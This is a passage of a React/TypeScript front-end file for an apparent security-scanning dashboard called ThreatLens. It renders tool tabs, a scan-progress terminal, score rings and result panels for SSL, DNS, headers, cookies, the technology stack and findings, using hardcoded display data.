                transition: "all 0.25s cubic-bezier(0.4, 0, 0.2, 1)",
              }}>
                <span style={{ fontSize: "15px" }}>{emoji}</span>
                <span>{label}</span>
              </button>
            );
          })}
        </div>

        {/* ── TOOL-SPECIFIC CONTENT (animates on tab switch) ── */}
        <div key={tool} style={{ width: "100%", animation: "tl-slide-up 0.35s ease forwards", opacity: 0 }}>
          <h1 className="font-extrabold mb-3 leading-tight" style={{
            fontSize: "clamp(1.8rem, 4.5vw, 3rem)",
            background: "linear-gradient(140deg, #e2e8f0 25%, #06b6d4 60%, #3b82f6 90%)",
            WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", backgroundClip: "text",
            letterSpacing: "-0.025em",
          }}>
            {tool === "website"  && <>Website Security<br />Intelligence</>}
            {tool === "password" && <>Password Strength<br />Analyzer</>}
            {tool === "url"      && <>URL Phishing<br />Detector</>}
          </h1>
          <p className="mb-8 max-w-lg mx-auto" style={{ fontSize: "1rem", color: "#64748b", lineHeight: "1.75" }}>
            {tool === "website"  && "Deep security assessment — SSL, DNS, headers, cookies, and risk intelligence in seconds."}
            {tool === "password" && "Analyze entropy, detect patterns, check breach databases, and get actionable improvement tips."}
            {tool === "url"      && "Detect phishing, homograph attacks, suspicious redirects, and domain reputation in real time."}
          </p>

          {/* Input area */}
          <div className="w-full max-w-xl mx-auto mb-4">
            {tool === "password" ? (
              <>
                <div className="flex gap-3 mb-3">
                  <div className="flex-1 relative">
                    <Key size={16} className="absolute left-4 top-1/2 -translate-y-1/2" style={{ color: "#334155" }} />
                    <input
                      type={showPass ? "text" : "password"}
                      className="tl-search w-full pl-10 pr-12 py-4 text-sm"
                      placeholder={meta.placeholder}
                      value={input}
                      onChange={e => setInput(e.target.value)}
                      onKeyDown={e => e.key === "Enter" && go()}
                    />
                    <button onClick={() => setShowPass(!showPass)} className="absolute right-4 top-1/2 -translate-y-1/2 transition-colors hover:text-cyan-400" style={{ color: "#334155", background: "none", border: "none", cursor: "pointer" }}>
                      {showPass ? <EyeOff size={15} /> : <Eye size={15} />}
                    </button>
                  </div>
                  <button onClick={go} className="tl-glow-btn flex items-center gap-2 px-6 py-4 rounded-xl font-bold text-sm" style={{ background: "linear-gradient(135deg, #06b6d4, #3b82f6)", color: "#030712", border: "1px solid rgba(6,182,212,0.35)", fontFamily: "'Plus Jakarta Sans', sans-serif", cursor: "pointer", whiteSpace: "nowrap" }}>
                    <Key size={14} />
                    {meta.btnLabel}
                  </button>
                </div>
                {/* Strength bar */}
                {input && strength && (
                  <div style={{ animation: "tl-fade-in 0.25s ease forwards" }}>
                    <div className="flex justify-between mb-1.5">
                      <span className="text-xs font-semibold" style={{ color: strength.color, fontFamily: "'JetBrains Mono', monospace" }}>{strength.label}</span>
                      <span className="text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>{input.length} chars</span>
                    </div>
                    <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: "999px", height: "4px", overflow: "hidden" }}>
                      <div style={{ background: `linear-gradient(90deg, ${strength.color}, ${strength.color}aa)`, width: `${strength.pct}%`, height: "100%", borderRadius: "999px", transition: "width 0.3s ease, background 0.3s ease", boxShadow: `0 0 8px ${strength.color}66` }} />
                    </div>
                  </div>
                )}
              </>
            ) : (
              <div className="flex gap-3">
                <div className="flex-1 relative">
                  {tool === "website" ? <Search size={16} className="absolute left-4 top-1/2 -translate-y-1/2" style={{ color: "#334155" }} /> : <Link2 size={16} className="absolute left-4 top-1/2 -translate-y-1/2" style={{ color: "#334155" }} />}
                  <input
                    className="tl-search w-full pl-10 pr-4 py-4 text-sm"
                    placeholder={meta.placeholder}
                    value={input}
                    onChange={e => setInput(e.target.value)}
                    onKeyDown={e => e.key === "Enter" && go()}
                  />
                </div>
                <button onClick={go} className="tl-glow-btn flex items-center gap-2 px-6 py-4 rounded-xl font-bold text-sm" style={{ background: "linear-gradient(135deg, #06b6d4, #3b82f6)", color: "#030712", border: "1px solid rgba(6,182,212,0.35)", fontFamily: "'Plus Jakarta Sans', sans-serif", cursor: "pointer", whiteSpace: "nowrap" }}>
                  <Zap size={14} />
                  {meta.btnLabel}
                </button>
              </div>
            )}
          </div>

          {/* Quick examples */}
          <div className="flex items-center gap-2 flex-wrap justify-center mb-10">
            <span className="text-xs" style={{ color: "#1e3a5f" }}>Try:</span>
            {meta.examples.map(ex => (
              <button key={ex} onClick={() => setInput(ex)} className="text-xs px-3 py-1 rounded-lg transition-all duration-150" style={{ color: "#475569", background: "rgba(6,182,212,0.04)", border: "1px solid rgba(6,182,212,0.1)", fontFamily: "'JetBrains Mono', monospace", cursor: "pointer" }}>
                {ex}
              </button>
            ))}
          </div>

          {/* Feature tags */}
          <div className="flex items-center gap-6 flex-wrap justify-center">
            {meta.features.map(({ Icon, label }) => (
              <div key={label} className="flex items-center gap-2">
                <Icon size={13} style={{ color: "#06b6d4" }} />
                <span className="text-xs" style={{ color: "#334155" }}>{label}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── SCAN TERMINAL ──────────────────────────────────────────────────────── */
function ScanTerminal({ target, step, steps }: { target: string; step: number; steps: ScanStep[] }) {
  const done = step >= steps.length;
  const progress = step < 0 ? 0 : done ? 100 : Math.round(((step + 1) / steps.length) * 100);
  const filled = Math.round(progress / 5);

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ background: "#030712" }}>
      <div className="absolute inset-0" style={{ background: "radial-gradient(ellipse at center, rgba(6,182,212,0.05) 0%, transparent 60%)" }} />

      <div className="relative" style={{ width: "min(540px, 94vw)", animation: "tl-fade-in 0.4s ease forwards" }}>
        {/* Terminal window */}
        <div style={{ background: "rgba(6, 12, 26, 0.97)", border: "1px solid rgba(6,182,212,0.22)", borderRadius: "14px", overflow: "hidden", boxShadow: "0 0 60px rgba(6,182,212,0.1), 0 0 120px rgba(6,182,212,0.04)" }}>
          {/* Title bar */}
          <div className="flex items-center gap-2 px-4 py-3" style={{ background: "rgba(6,182,212,0.05)", borderBottom: "1px solid rgba(6,182,212,0.1)" }}>
            <div className="w-3 h-3 rounded-full" style={{ background: "#ef4444" }} />
            <div className="w-3 h-3 rounded-full" style={{ background: "#f59e0b" }} />
            <div className="w-3 h-3 rounded-full" style={{ background: "#10b981" }} />
            <span className="ml-3 text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>
              threatlens — scan engine v2.1.0
            </span>
          </div>

          {/* Body */}
          <div className="p-6" style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: "13px", lineHeight: "1.85", color: "#64748b" }}>
            {/* ASCII header */}
            <div className="text-center mb-5">
              <div style={{ color: "#1e3a5f", fontSize: "11px" }}>╔══════════════════════════════════════════╗</div>
              <div style={{ color: "#1e3a5f", fontSize: "11px" }} className="flex justify-center items-center">
                ║&nbsp;&nbsp;
                <span style={{ color: "#06b6d4", letterSpacing: "3px", fontWeight: "700" }}>⚡ THREATLENS ENGINE</span>
                &nbsp;&nbsp;║
              </div>
              <div style={{ color: "#1e3a5f", fontSize: "11px" }}>╚══════════════════════════════════════════╝</div>
            </div>

            {/* Target */}
            <div className="mb-4">
              <span style={{ color: "#1e3a5f" }}>Target&nbsp;&nbsp;&nbsp;</span>
              <span style={{ color: "#e2e8f0" }}>{target}</span>
            </div>

            {/* Progress */}
            <div className="mb-5">
              <div className="flex justify-between mb-1" style={{ fontSize: "11px" }}>
                <span style={{ color: "#1e3a5f" }}>Progress</span>
                <span style={{ color: done ? "#10b981" : "#06b6d4" }}>{progress}%</span>
              </div>
              <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "4px", height: "5px", overflow: "hidden" }}>
                <div style={{ background: done ? "linear-gradient(90deg, #10b981, #06b6d4)" : "linear-gradient(90deg, #06b6d4, #3b82f6)", height: "100%", width: `${progress}%`, borderRadius: "4px", transition: "width 0.45s ease", boxShadow: "0 0 8px rgba(6,182,212,0.5)" }} />
              </div>
              <div style={{ color: "#1e293b", marginTop: "4px", fontSize: "11px", userSelect: "none" }}>
                {"█".repeat(filled)}{"░".repeat(20 - filled)}&nbsp;
              </div>
            </div>

            {/* Steps */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              {steps.map((s, i) => {
                const past    = i < step;
                const current = i === step && !done;
                const future  = i > step;
                return (
                  <div key={i} className="flex items-center gap-3 text-xs" style={{ opacity: future ? 0.25 : 1, transition: "opacity 0.35s ease" }}>
                    <span style={{ width: "14px", display: "inline-block", textAlign: "center" }}>
                      {past    && <span style={{ color: "#10b981" }}>✓</span>}
                      {current && <span style={{ color: "#06b6d4", animation: "tl-scan-blink 0.75s ease-in-out infinite" }}>⟳</span>}
                      {future  && <span style={{ color: "#1e293b" }}>·</span>}
                    </span>
                    <span style={{ color: past ? "#10b981" : current ? "#e2e8f0" : "#1e293b", transition: "color 0.3s ease" }}>
                      {s.label}{current ? "..." : ""}
                    </span>
                  </div>
                );
              })}
              {done && (
                <div className="flex items-center gap-3 mt-2" style={{ animation: "tl-slide-up 0.4s ease forwards", opacity: 0 }}>
                  <span style={{ color: "#10b981" }}>✓</span>
                  <span style={{ color: "#10b981", fontWeight: "700", letterSpacing: "1px" }}>SCAN COMPLETE — Rendering results...</span>
                </div>
              )}
            </div>

            {/* Cursor */}
            {!done && (
              <div className="mt-4 flex items-center gap-1">
                <span style={{ color: "#1e3a5f" }}>$</span>
                <span style={{ color: "#06b6d4", animation: "tl-scan-blink 1s ease-in-out infinite" }}>▊</span>
              </div>
            )}
          </div>
        </div>

        {/* Scanline */}
        <div className="absolute inset-0 pointer-events-none overflow-hidden rounded-xl">
          <div style={{ position: "absolute", width: "100%", height: "2px", background: "linear-gradient(90deg, transparent, rgba(6,182,212,0.25), transparent)", animation: "tl-scanline 4s linear infinite" }} />
        </div>
      </div>
    </div>
  );
}

/* ─── SCORE RING ─────────────────────────────────────────────────────────── */
function ScoreRing({ display, final, riskMode = false }: { display: number; final: number; riskMode?: boolean }) {
  const r = 72;
  const circ = 2 * Math.PI * r;
  const done = display >= final;
  const color = riskMode
    ? (display >= 70 ? "#ef4444" : display >= 50 ? "#f59e0b" : display >= 30 ? "#06b6d4" : "#10b981")
    : (display >= 85 ? "#10b981" : display >= 65 ? "#06b6d4" : display >= 45 ? "#f59e0b" : "#ef4444");
  const offset = circ * (1 - display / 100);

  return (
    <div className="relative" style={{ width: 176, height: 176, animation: done ? "tl-score-pulse 1.8s ease forwards" : "none" }}>
      <svg width="176" height="176" style={{ transform: "rotate(-90deg)" }}>
        <circle cx="88" cy="88" r={r} fill="none" stroke="rgba(255,255,255,0.04)" strokeWidth="10" />
        <circle cx="88" cy="88" r={r} fill="none" stroke={color} strokeWidth="10" strokeLinecap="round"
          strokeDasharray={circ} strokeDashoffset={offset}
          style={{ transition: "stroke-dashoffset 0.04s linear, stroke 0.6s ease", filter: `drop-shadow(0 0 7px ${color})` }}
        />
        <circle cx="88" cy="88" r={r} fill="none" stroke={color} strokeWidth="20" strokeLinecap="round"
          strokeDasharray={circ} strokeDashoffset={offset}
          style={{ opacity: 0.07, transition: "stroke-dashoffset 0.04s linear" }}
        />
      </svg>
      <div className="absolute inset-0 flex flex-col items-center justify-center" style={{ fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
        <span className="font-extrabold" style={{ fontSize: "40px", color, lineHeight: 1, letterSpacing: "-2px" }}>{display}</span>
        <span className="text-xs mt-1" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>/ 100</span>
      </div>
    </div>
  );
}

/* ─── STATUS BADGE ───────────────────────────────────────────────────────── */
function StatusBadge({ status }: { status: CardStatus }) {
  const cfg = ({
    pass: { label: "PASS", color: "#10b981" },
    warn: { label: "WARN", color: "#f59e0b" },
    fail: { label: "FAIL", color: "#ef4444" },
    info: { label: "INFO", color: "#3b82f6" },
  } as Record<string, { label: string; color: string }>)[status] ?? { label: status.toUpperCase(), color: "#64748b" };
  return (
    <span className="tl-pill text-xs" style={{ background: `${cfg.color}14`, color: cfg.color, border: `1px solid ${cfg.color}28` }}>
      {cfg.label}
    </span>
  );
}

/* ─── SECTION: OVERVIEW ──────────────────────────────────────────────────── */
function OverviewSection({ score, cardCount, setSection }: { score: number; cardCount: number; setSection: (s: Section) => void }) {
  const scoreColor = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";

  return (
    <div className="space-y-5 tl-fade-enter">
      {/* Hero row */}
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        {/* Score ring */}
        <div className="tl-glass p-6 flex flex-col items-center justify-center" style={{ minWidth: "210px" }}>
          <ScoreRing display={score} final={D.score} />
          <div className="mt-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color: scoreColor, letterSpacing: "-0.5px", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{D.grade}</div>
            <div className="text-sm font-medium mt-0.5" style={{ color: "#94a3b8" }}>{D.risk}</div>
            <div className="text-xs mt-0.5" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>{D.confidence}</div>
          </div>
        </div>

        {/* Right column: stats + donut */}
        <div className="grid gap-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
          {/* Stats */}
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SCAN SUMMARY</div>
            <div className="space-y-3">
              {[
                { label: "Total Checks",  value: "34",              color: "#94a3b8" },
                { label: "Passed",        value: "26",              color: "#10b981" },
                { label: "Warnings",      value: "6",               color: "#f59e0b" },
                { label: "Critical",      value: "2",               color: "#ef4444" },
                { label: "Risk Score",    value: `${score} / 100`,  color: scoreColor },
              ].map(({ label, value, color }) => (
                <div key={label} className="flex items-center justify-between">
                  <span className="text-xs" style={{ color: "#475569" }}>{label}</span>
                  <span className="font-bold text-sm" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Donut */}
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-1" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>RISK DISTRIBUTION</div>
            <ResponsiveContainer width="100%" height={130}>
              <PieChart>
                <Pie data={D.donut} cx="50%" cy="50%" innerRadius={38} outerRadius={56} paddingAngle={3} dataKey="value" animationBegin={400} animationDuration={1200}>
                  {D.donut.map((entry, i) => <Cell key={i} fill={entry.color} />)}
                </Pie>
                <Tooltip contentStyle={{ background: "#080f1e", border: "1px solid rgba(6,182,212,0.18)", borderRadius: "8px", fontSize: "12px", fontFamily: "'JetBrains Mono', monospace" }} />
              </PieChart>
            </ResponsiveContainer>
            <div className="flex justify-center gap-3">
              {D.donut.map(d => (
                <div key={d.name} className="flex items-center gap-1.5">
                  <div className="w-2 h-2 rounded-full" style={{ background: d.color }} />
                  <span className="text-xs" style={{ color: "#475569" }}>{d.name}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Radar */}
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SECURITY RADAR</div>
        <ResponsiveContainer width="100%" height={250}>
          <RadarChart data={D.radar} outerRadius={88}>
            <PolarGrid stroke="rgba(6,182,212,0.07)" />
            <PolarAngleAxis dataKey="subject" tick={{ fill: "#475569", fontSize: 11, fontFamily: "'JetBrains Mono', monospace" }} />
            <Radar dataKey="value" stroke="#06b6d4" fill="#06b6d4" fillOpacity={0.1} strokeWidth={2} animationBegin={600} animationDuration={1400} dot={{ r: 3, fill: "#06b6d4", strokeWidth: 0 }} />
          </RadarChart>
        </ResponsiveContainer>
      </div>

      {/* Module cards */}
      <div>
        <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SECURITY MODULES</div>
        <div className="grid gap-3" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(210px, 1fr))" }}>
          {D.modules.map((mod, i) => {
            const visible = i < cardCount;
            const sc = {pass: "#10b981", warn: "#f59e0b", info: "#3b82f6", fail: "#ef4444",}[mod.status];
            const Icon = mod.Icon;
            return (
              <div key={i} onClick={() => setSection(mod.id)}
                className="tl-glass p-4 cursor-pointer"
                style={{ opacity: visible ? 1 : 0, transform: visible ? "translateY(0)" : "translateY(18px)", transition: `opacity 0.4s ease ${i * 0.055}s, transform 0.4s ease ${i * 0.055}s` }}
              >
                <div className="flex items-start justify-between mb-3">
                  <div className="p-1.5 rounded-lg" style={{ background: `${sc}12` }}>
                    <Icon size={15} style={{ color: sc }} />
                  </div>
                  <StatusBadge status={mod.status} />
                </div>
                <div className="text-sm font-semibold mb-0.5" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{mod.label}</div>
                <div className="text-xs mb-3" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{mod.metric}</div>
                <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "999px", height: "3px", overflow: "hidden" }}>
                  <div style={{ background: `linear-gradient(90deg, ${sc}, ${sc}88)`, width: visible ? `${mod.score}%` : "0%", height: "100%", borderRadius: "999px", transition: `width 0.9s ease ${i * 0.055 + 0.3}s` }} />
                </div>
                <div className="flex justify-between mt-1.5">
                  <span className="text-xs" style={{ color: "#1e3a5f" }}>Score</span>
                  <span className="text-xs" style={{ color: sc, fontFamily: "'JetBrains Mono', monospace" }}>{mod.score}</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: SSL ───────────────────────────────────────────────────────── */
function SSLSection() {
  const s = D.ssl;
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Lock} label="SSL / TLS Certificate" badge={{ text: s.grade, color: "#10b981" }} />
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        {/* Grade ring */}
        <div className="tl-glass p-6 flex flex-col items-center gap-3" style={{ minWidth: "180px" }}>
          <div className="w-20 h-20 rounded-full flex items-center justify-center" style={{ background: "rgba(16,185,129,0.1)", border: "2px solid rgba(16,185,129,0.3)" }}>
            <span className="font-extrabold text-3xl" style={{ color: "#10b981", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{s.grade}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <CheckCircle size={14} style={{ color: "#10b981" }} />
            <span className="text-sm" style={{ color: "#10b981" }}>Valid Certificate</span>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{s.daysLeft}</div>
            <div className="text-xs" style={{ color: "#334155" }}>days until expiry</div>
          </div>
        </div>

        {/* Details */}
        <div className="tl-glass p-5">
          <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>CERTIFICATE DETAILS</div>
          <div className="space-y-0">
            {[
              ["Issuer",       s.issuer    ],
              ["Subject",      s.subject   ],
              ["Serial",       s.serial    ],
              ["Expires",      s.expires   ],
              ["Protocol",     s.protocol  ],
              ["Cipher Suite", s.cipher    ],
              ["Key Size",     `${s.bits}-bit RSA`],
              ["CT Logging",   s.transparency ? "✓ Enabled" : "✗ Disabled"],
              ["OCSP",         s.ocsp      ],
              ["HSTS",         s.hsts ? "✓ Preloaded" : "✗ Missing"],
            ].map(([k, v]) => (
              <div key={k} className="tl-table-row flex items-center py-2.5 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
                <span className="text-xs w-32 flex-shrink-0" style={{ color: "#475569" }}>{k}</span>
                <span className="text-xs font-medium flex-1 min-w-0 truncate" style={{ color: String(v).startsWith("✓") ? "#10b981" : String(v).startsWith("✗") ? "#ef4444" : "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{v}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: DNS ───────────────────────────────────────────────────────── */
function DNSSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Globe} label="DNS Records" badge={{ text: "DNSSEC ✓", color: "#10b981" }} />
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>DNS RECORDS ({D.dns.length})</div>
        <div>
          {D.dns.map((r, i) => (
            <div key={i} className="tl-table-row flex items-center gap-4 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
              <span className="text-xs font-bold px-2 py-0.5 rounded" style={{ background: "rgba(6,182,212,0.1)", color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace", minWidth: "48px", textAlign: "center" }}>{r.type}</span>
              <span className="text-xs flex-1 min-w-0 truncate" style={{ color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{r.value}</span>
              <span className="text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>TTL {r.ttl}</span>
            </div>
          ))}
        </div>
      </div>
      <div className="grid gap-3" style={{ gridTemplateColumns: "1fr 1fr 1fr" }}>
        {[
          { label: "DNSSEC",  value: "Enabled",        color: "#10b981", icon: CheckCircle },
          { label: "CAA",     value: "Present",         color: "#10b981", icon: CheckCircle },
          { label: "Spoofing", value: "Protected",      color: "#10b981", icon: CheckCircle },
        ].map(({ label, value, color, icon: Icon }) => (
          <div key={label} className="tl-glass p-4 flex items-center gap-3">
            <Icon size={16} style={{ color }} />
            <div>
              <div className="text-xs font-semibold" style={{ color: "#94a3b8" }}>{label}</div>
              <div className="text-xs" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── SECTION: HEADERS ───────────────────────────────────────────────────── */
function HeadersSection() {
  const present = D.headers.filter(h => h.present).length;
  const barData = D.headers.map(h => ({ name: h.name.replace("X-Content-Type-Options", "X-CTO").replace("Cross-Origin-Opener-Policy", "COOP").replace("Content-Security-Policy", "CSP").replace("Strict-Transport-Security", "HSTS").replace("Referrer-Policy", "Ref-Policy").replace("Permissions-Policy", "Perm-Policy").replace("X-Frame-Options", "X-Frame").replace("X-XSS-Protection", "X-XSS"), value: h.present ? 1 : 0 }));

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Shield} label="Security Headers" badge={{ text: `${present} / ${D.headers.length}`, color: present >= 7 ? "#10b981" : "#f59e0b" }} />

      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>HEADER COMPLIANCE</div>
        <ResponsiveContainer width="100%" height={140}>
          <BarChart data={barData} barSize={24}>
            <XAxis dataKey="name" tick={{ fill: "#475569", fontSize: 9, fontFamily: "'JetBrains Mono', monospace" }} axisLine={false} tickLine={false} />
            <Bar dataKey="value" radius={[4, 4, 0, 0]}>
              {barData.map((entry, i) => (
                <Cell key={i} fill={entry.value ? "#10b981" : "#ef444455"} />
              ))}
            </Bar>
          </BarChart>
        </ResponsiveContainer>
      </div>

      <div className="tl-glass p-5">
        <div className="space-y-0">
          {D.headers.map((h, i) => (
            <div key={i} className="tl-table-row flex items-start gap-3 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
              <div className="mt-0.5 flex-shrink-0">
                {h.present
                  ? <CheckCircle size={14} style={{ color: "#10b981" }} />
                  : <XCircle    size={14} style={{ color: "#ef4444" }} />}
              </div>
              <div className="flex-1 min-w-0">
                <div className="text-xs font-semibold" style={{ color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{h.name}</div>
                {h.value
                  ? <div className="text-xs mt-0.5 truncate" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{h.value}</div>
                  : <div className="text-xs mt-0.5" style={{ color: "#ef444488" }}>Not present</div>}
              </div>
              <span className="flex-shrink-0">
                {h.present
                  ? <span className="tl-pill text-xs" style={{ background: "#10b98112", color: "#10b981", border: "1px solid #10b98128" }}>Present</span>
                  : <span className="tl-pill text-xs tl-warn-badge" style={{ background: "#ef444412", color: "#ef4444", border: "1px solid #ef444428" }}>Missing</span>}
              </span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: COOKIES ───────────────────────────────────────────────────── */
function CookiesSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Database} label="Cookie Security" badge={{ text: `${D.cookies.length} Cookies`, color: "#f59e0b" }} />
      <div className="tl-glass p-5">
        <div className="space-y-3">
          {D.cookies.map((c, i) => {
            const issues = (!c.secure ? 1 : 0) + (!c.httpOnly ? 1 : 0) + (!c.sameSite ? 1 : 0);
            const statusColor = issues === 0 ? "#10b981" : issues === 1 ? "#f59e0b" : "#ef4444";
            return (
              <div key={i} className="tl-glass p-4" style={{ background: "rgba(6,10,20,0.4)" }}>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-sm font-semibold" style={{ color: "#e2e8f0", fontFamily: "'JetBrains Mono', monospace" }}>{c.name}</span>
                  <span className="text-xs" style={{ color: statusColor }}>{issues === 0 ? "Secure" : `${issues} Issue${issues > 1 ? "s" : ""}`}</span>
                </div>
                <div className="grid gap-2" style={{ gridTemplateColumns: "repeat(4, 1fr)" }}>
                  {[
                    { label: "Secure",   ok: c.secure,          value: c.secure ? "Yes" : "No" },
                    { label: "HttpOnly", ok: c.httpOnly,        value: c.httpOnly ? "Yes" : "No" },
                    { label: "SameSite", ok: !!c.sameSite,      value: c.sameSite ?? "Missing" },
                    { label: "Path",     ok: true,              value: c.path },
                  ].map(({ label, ok, value }) => (
                    <div key={label} className="text-center">
                      <div className="text-xs mb-0.5" style={{ color: "#334155" }}>{label}</div>
                      <div className="text-xs font-semibold" style={{ color: ok ? "#10b981" : "#f59e0b", fontFamily: "'JetBrains Mono', monospace" }}>{value}</div>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: TECH ──────────────────────────────────────────────────────── */
function TechSection() {
  const catColors: Record<string, string> = {
    Frontend: "#06b6d4", Backend: "#3b82f6", Server: "#10b981",
    "CDN / WAF": "#f59e0b", "CI / CD": "#8b5cf6", Database: "#06b6d4",
    Cache: "#ef4444", CSS: "#a855f7", Storage: "#f59e0b",
  };
  const categories = [...new Set(D.technologies.map(t => t.category))];

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Code} label="Technology Stack" badge={{ text: `${D.technologies.length} Detected`, color: "#06b6d4" }} />
      {categories.map(cat => (
        <div key={cat} className="tl-glass p-5">
          <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>{cat.toUpperCase()}</div>
          <div className="flex flex-wrap gap-2">
            {D.technologies.filter(t => t.category === cat).map((t, i) => {
              const color = catColors[cat] ?? "#64748b";
              return (
                <span key={i} className="tl-pill" style={{ background: `${color}12`, color, border: `1px solid ${color}28`, animationDelay: `${i * 0.07}s` }}>
                  {t.name}
                </span>
              );
            })}
          </div>
        </div>
      ))}
      <div className="tl-glass p-4 flex items-center gap-3">
        <CheckCircle size={16} style={{ color: "#10b981" }} />
        <span className="text-sm" style={{ color: "#94a3b8" }}>No known vulnerable versions detected across all technology components.</span>
      </div>
    </div>
  );
}

/* ─── SECTION: FINDINGS ──────────────────────────────────────────────────── */
function FindingsSection() {
  const warnings = D.findings.filter(f => f.severity === "warning");
  const passed   = D.findings.filter(f => f.severity === "passed");
  const info     = D.findings.filter(f => f.severity === "info");

  const CFG: Record<Severity, { color: string; Icon: React.ElementType; label: string }> = {
    warning: { color: "#f59e0b", Icon: AlertTriangle, label: "Warning" },
    passed:  { color: "#10b981", Icon: CheckCircle,   label: "Passed"  },
    info:    { color: "#3b82f6", Icon: Info,           label: "Info"    },
  };

  const all = [...warnings, ...passed, ...info];

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={AlertTriangle} label="Risk Findings" badge={{ text: `${warnings.length} Warnings`, color: "#f59e0b" }} />
      <div className="grid gap-2" style={{ gridTemplateColumns: "repeat(3, 1fr)" }}>
        {[
          { label: "Warnings", value: warnings.length, color: "#f59e0b" },
          { label: "Passed",   value: passed.length,   color: "#10b981" },
          { label: "Info",     value: info.length,     color: "#3b82f6" },
        ].map(({ label, value, color }) => (
          <div key={label} className="tl-glass p-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{value}</div>
            <div className="text-xs mt-0.5" style={{ color: "#475569" }}>{label}</div>
          </div>
        ))}
      </div>

      {/* Timeline */}
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>FINDINGS TIMELINE</div>
        <div className="relative">
          <div className="absolute left-5 top-0 bottom-0 w-px" style={{ background: "rgba(6,182,212,0.1)" }} />
          <div className="space-y-0">
            {all.map((f, i) => {
              const cfg = CFG[f.severity];
              const Icon = cfg.Icon;
              return (
                <div key={i} className="relative flex gap-4 pb-5" style={{ animationDelay: `${i * 0.08}s` }}>
                  <div className="flex-shrink-0 relative z-10 w-10 h-10 rounded-full flex items-center justify-center" style={{ background: `${cfg.color}12`, border: `1px solid ${cfg.color}28` }}>
                    <Icon size={14} style={{ color: cfg.color }} />
                  </div>
                  <div className="flex-1 min-w-0 pt-1.5">
                    <div className="flex items-center gap-2 mb-1">
